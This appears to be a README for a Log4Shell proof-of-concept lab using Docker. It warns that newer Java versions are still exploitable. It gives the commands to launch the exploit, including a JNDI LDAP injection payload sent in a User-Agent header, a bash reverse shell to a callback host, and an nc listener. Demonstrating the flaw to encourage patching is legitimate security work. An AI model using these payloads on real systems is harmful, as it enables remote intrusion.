# fun with log4shell and docker

This repo to proof exploitation in latest java version exist too !
Please do not rely on your java version to be safe and upgrade neo4j package !

- vulnerable app from : https://github.com/christophetd/log4shell-vulnerable-app.git
- vulnerability explained : https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/


## play 
- launch the vulnerable app : `./start_vuln_server.sh`
- launch exploit :  `./exploit.sh <rogueserver_ip> <rogueserver_port> <cmd>`
  - example : ./exploit.sh 172.28.0.1 4445 'bash -i >& /dev/tcp/172.28.0.1/4444 0>&1'
- trig the exploit and start listener : 
  - example : `( sleep 2 && curl 127.0.0.1:8081 -H 'User-Agent: ${jndi:ldap://172.28.0.1:4445/o=tomcat}' ) & nc -nlvp 4444 `'

![](./poc.png)
